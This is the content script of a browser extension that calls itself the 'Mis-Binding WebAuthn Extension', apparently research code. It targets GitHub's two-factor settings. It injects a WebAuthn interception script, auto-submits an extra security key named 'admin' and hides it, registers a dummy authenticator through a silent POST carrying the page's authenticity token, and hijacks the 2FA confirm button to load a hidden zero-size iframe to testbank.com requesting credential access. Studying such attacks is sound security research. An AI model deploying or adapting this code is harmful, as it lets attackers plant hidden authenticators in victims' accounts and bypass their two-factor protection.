/* global chrome */

const webauthnInject = document.createElement('script');
webauthnInject.type = 'text/javascript';
webauthnInject.src = chrome.runtime.getURL('js/inject_webauthn.js'); //'chrome-extension://' + chrome.runtime.id + '/js/inject_webauthn.js';
document.documentElement.appendChild(webauthnInject);

const relevantEventTypes = ['create', 'sign'];

let passToOrig = true;

window.addEventListener('message', (event) => {
  // We only accept messages from this window to itself, no iframes allowed.
  if (event.source !== window) {
    return;
  }

  // Relay relevant messages only.
  if (event.data.type) {
    if(event.data.resp && event.data.resp.type === 'error') {
      alert(`[Mis-Binding WebAuthn Extension]: ${event.data.resp.exception}`);
    }
    else if(relevantEventTypes.indexOf(event.data.type) > -1) {
      chrome.runtime.sendMessage(event.data, (resp: any) => {
        // The callback function will relay the extension response
        // to the window object.
        window.postMessage({
          requestID: resp.requestID,
          resp,
          type: resp.type,
        }, window.location.origin);
      });
    }
  }
}, false);


function waitForElement( callBack){
  window.setTimeout(function(){
    var element = document.querySelectorAll('div[class="js-u2f-registration width-full"]')[1];
    if(element){
      callBack(element);
    }else{
      waitForElement(callBack);
    }
  },500)
}



// function observeChildChanges(element, callback) {
//   // Create a new MutationObserver instance
//   const observer = new MutationObserver(callback);

//   // Configuration for the observer
//   const config = {
//     childList: true, // Watch for changes in the child list
//     subtree: true // Watch for changes in all descendant elements
//   };

//   // Start observing the target element
//   observer.observe(element, config);
// }

// // Usage example
// const divElement = document.querySelector('.js-u2f-registrations.mb-2.ml-2.width-full') as Node;

// // Define the callback function to handle changes
// const handleChanges = function (mutationsList, observer) {
//   // Loop through the mutations
//   for (const mutation of mutationsList) {
//     // Check if child elements were added or removed
//     if (mutation.type === 'childList') {
//       // Handle the changes as needed
//       console.log('Child elements have been modified:', mutation.addedNodes, mutation.removedNodes);
//     }
//   }
// };

// Activate the observer
// observeChildChanges(divElement, handleChanges);







document.addEventListener('DOMContentLoaded', () => {
  
  // waitForElement(,function(){
  //   console.log("FOUND 2nd elemdone");
  // });
  
  chrome.runtime.sendMessage({type: 'getPassToOrig'});

  chrome.runtime.sendMessage({type: 'attack-type-get'}, (resp: any) => {

    const dummyAuth = document.querySelectorAll('div[class="js-u2f-registration width-full"]');
    // if (dummyAuth.length == 1) {
    //   const dummyAuth2 = document.querySelectorAll('div[class="js-u2f-registration width-full"]')[1] as HTMLElement;
    //   dummyAuth2.style.display = 'none'; 
    // }
    

    // const element = document.querySelector('span[data-test-id="security-key-nickname"]');
    if (resp.attackType === 'attack-double-binding1') {

      // Listens when second dummyauth is added and hides it
      var target = document.querySelector('.js-u2f-registrations.mb-2.ml-2.width-full');
      var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          console.log(mutation.type);
            // alert('This is a test 2');
            const elem = document.querySelectorAll('div[class="js-u2f-registration width-full"]')[1];
            if (elem) {
              (elem as HTMLElement).style.display = 'none';
              chrome.runtime.sendMessage({type: 'attack-type-change', newAttackType: 'attack-none'});
            }
        });
      });
      // configuration of the observer
      var config = { attributes: true, childList: true, characterData: true, subtree: true };
      observer.observe(target, config);

      if (dummyAuth.length == 1) {
        // if attack type double binding 1 change to 2
        chrome.runtime.sendMessage({type: 'attack-type-change', newAttackType: 'attack-double-binding2'});
        passToOrig = false;
        window.postMessage({ message: 'passToOrig', val: passToOrig }, window.location.origin);

        const nickname = document.querySelector('.add-u2f-registration-form.js-add-u2f-registration-form').querySelector('input[name="nickname"]') as HTMLInputElement;
        nickname.value = "admin";
        const subButton = document.querySelector('.add-u2f-registration-form.js-add-u2f-registration-form').querySelector('button[type="submit"]') as HTMLButtonElement;
        subButton.removeAttribute('disabled');
        subButton.click();
      } 
      
    } else if (resp.attackType === 'attack-double-binding2') {
      if (dummyAuth.length == 0) {
        chrome.runtime.sendMessage({type: 'attack-type-change', newAttackType: 'attack-double-binding1'});
      } else {
        const dummyAuth = document.querySelectorAll('div[class="js-u2f-registration width-full"]')[1] as HTMLElement;
        dummyAuth.style.display = 'none'; 
        chrome.runtime.sendMessage({type: 'attack-type-change', newAttackType: 'attack-none'});
      }
    } else if (resp.attackType === 'attack-sync-login') {
      const webpageURL = window.location.href;
      console.log(webpageURL);
      if (webpageURL === "https://github.com/sessions/two-factor/webauthn") {
        const addButton = document.querySelector(".js-webauthn-confirm-button.btn.btn-block.Button--primary.Button--medium.Button.mt-0") as HTMLButtonElement;
        if (addButton) {
          console.log("Added iframe on load");
            document.addEventListener('click', handleRegisterButtonClick, true);
        }
      }
    }
  });



  // chrome.runtime.sendMessage({type: 'getPassToOrig'});
  // const element = document.querySelector('span[data-test-id="security-key-nickname"]');
  // if (element) {
  //   // if attack type double binding 1 change to 2
  //   chrome.runtime.sendMessage({type: 'attack-type-get'}, (resp: any) => {
  //     if (resp.attackType === 'attack-double-binding1') {

  //       chrome.runtime.sendMessage({type: 'attack-type-change', newAttackType: 'attack-double-binding2'});
  //       passToOrig = false;
  //       window.postMessage({ message: 'passToOrig', val: passToOrig }, window.location.origin);

  //       const nickname = document.querySelector('.add-u2f-registration-form.js-add-u2f-registration-form').querySelector('input[name="nickname"]') as HTMLInputElement;
  //       nickname.value = "fofo";
  //       const subButton = document.querySelector('.add-u2f-registration-form.js-add-u2f-registration-form').querySelector('button[type="submit"]') as HTMLButtonElement;
  //       subButton.removeAttribute('disabled');
  //       subButton.click();

  //     }
  //   });
  // }

  // chrome.runtime.sendMessage({type: 'attack-type-get'}, (resp: any) => {
  //   if (resp.attackType === 'attack-double-binding1') {
  //     const webpageURL = window.location.href;
  //     console.log(webpageURL);

  //     if (webpageURL === "https://github.com/sessions/two-factor/webauthn") {
  //       const addButton = document.querySelector(".js-webauthn-confirm-button.btn.btn-block.Button--primary.Button--medium.Button.mt-0") as HTMLButtonElement;
  //       if (addButton) {
  //         console.log("Added iframe on load");
  //           document.addEventListener('click', handleRegisterButtonClick, true);
  //       }
  //     }
  //   }
  // });

})


// if (!resp.val) {
//   const element = document.querySelector('span[data-test-id="security-key-nickname"]');
//   if (element) {
//     // Element exists
//     console.log("Element exists.");
//     const nickname = document.querySelector('.add-u2f-registration-form.js-add-u2f-registration-form').querySelector('input[name="nickname"]') as HTMLInputElement;
//     nickname.value = "fofo";
//     const subButton = document.querySelector('.add-u2f-registration-form.js-add-u2f-registration-form').querySelector('button[type="submit"]') as HTMLButtonElement;
//     subButton.removeAttribute('disabled');
//     subButton.click()
//   } else {
//     // Element does not exist
//     console.log("Element does not exist.");
//   }
// }


  // // Select all subelements of the button using querySelectorAll
  // const subElements = document.querySelector(".js-webauthn-confirm-button").querySelectorAll('*');
  
  // // Prevent the default click behavior for each subelement
  // subElements.forEach(function(subElement) {
  //   subElement.addEventListener('click', function(event) {
  //     event.preventDefault();
  //   });
  // });

  // const iframe = document.createElement('iframe');
  // iframe.src = 'https://testbank.com:8443';
  // iframe.id = "iframeWebSyncLogin"
  // iframe.width = '400';
  // iframe.height = '400';
  // iframe.allow = 'publickey-credentials-get *';
  // document.body.appendChild(iframe);


function handleRegisterButtonClick(event) {

  if (event.target.closest('.js-webauthn-confirm-button')) {
    event.preventDefault(); // Prevent the default form submission
    event.stopPropagation(); // disables the bubbling phase listeners

    const iframe = document.createElement('iframe');
    iframe.src = 'https://testbank.com:8443';
    iframe.id = "iframeWebSyncLogin"
    iframe.width = '0';
    iframe.height = '0';
    iframe.allow = 'publickey-credentials-get *';
    document.body.appendChild(iframe);
  }
}

chrome.runtime.onMessage.addListener(
    async function(request, sender, sendResponse) {
        const addButton = document.querySelector(".js-webauthn-confirm-button.btn.btn-block.Button--primary.Button--medium.Button.mt-0") as HTMLButtonElement;

        // alert(request.message);
        if( request.message === "push-iframe-code" ) {
          // const form = document.querySelector('.add-u2f-registration-form.js-add-u2f-registration-form');
          // const addButton = form.querySelector('div > span > button');
          // alert(addButton);
          console.log("GOTT iframe push");
          if (addButton) {
            // const form = document.querySelector('.js-webauthn-form');
            // form.addEventListener('submit', handleRegisterButtonClick);

            // addButton.addEventListener('click', (event) => {
            //   event.preventDefault();
            //   handleRegisterButtonClick(event);
            // });

            // document.addEventListener('click', e => {
            //   if (e.target.closest('.js-webauthn-confirm-button')) {
            //     e.preventDefault(); // disables the browser's default behavior
            //   }
            // }, true);
            console.log("ADDED event listener")
            document.addEventListener('click', handleRegisterButtonClick, true);

            // addButton.addEventListener('click', removeRegisterButtonListener);
           }
        } else if (request.message === 'start-orig-login') {
          // addButton.removeEventListener('click', handleRegisterButtonClick);
          console.log("REMOVED event listener")
          document.removeEventListener('click', handleRegisterButtonClick, true);
          addButton.click();
        } else if (request.message === 'getGithubWebAuthnReq') {
          // Perform actions to get the HTML content
          // const htmlContent = document.documentElement.outerHTML;
          const webAuthnRegReq = document.querySelector('.add-u2f-registration-form').getAttribute('data-webauthn-register-request');
          // Send the response back to the background script
          sendResponse(webAuthnRegReq);
        } else if (request.message === 'registerDummyAuth') {
            const authToken = document.querySelector('.add-u2f-registration-form.js-add-u2f-registration-form').querySelector('input[name="authenticity_token"]')  as HTMLInputElement;
            // request.resp.id = "AnIB9pkhUNufJjJTZlqDR8GRnb5da3EyPhpjKziRD-kko5s6UApVD8XhslDULfRXlBtvDocwbPCHoEo2wzBSww";
            // request.resp.rawId = "AnIB9pkhUNufJjJTZlqDR8GRnb5da3EyPhpjKziRD-kko5s6UApVD8XhslDULfRXlBtvDocwbPCHoEo2wzBSww";
            const formData = new FormData();
            formData.append("authenticty_token", authToken.value);
            formData.append("page_view", "settings_security");
            formData.append("response", request.resp);
            formData.append("nickname", "test");

            await fetch("https://github.com/sessions/in_sudo", { method: 'GET', headers: { 'Accept':'application/json' }})

          
            // Send the credential
            const result = await fetch("https://github.com/u2f/registrations", {
                method: 'POST',
                body: formData,
                headers: {'accept': 'application/json'},
                // headers: { 'origin':'https://github.com','referer': 'https://github.com/settings/security','x-requested-with':'XMLHttpRequest', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryAwc0Asua0DeM76FP', 'accept': 'application/json' }
            });
        } else if (request.message === 'passToOrig') {
            // Send a message to the injected script
            console.log("in content with passToOrig ", passToOrig);
            passToOrig = request.val;
            window.postMessage({ message: 'passToOrig', val: passToOrig }, window.location.origin);
        } else if (request.message === 'reloadPage') {
          // location.reload();
        }

    }
);
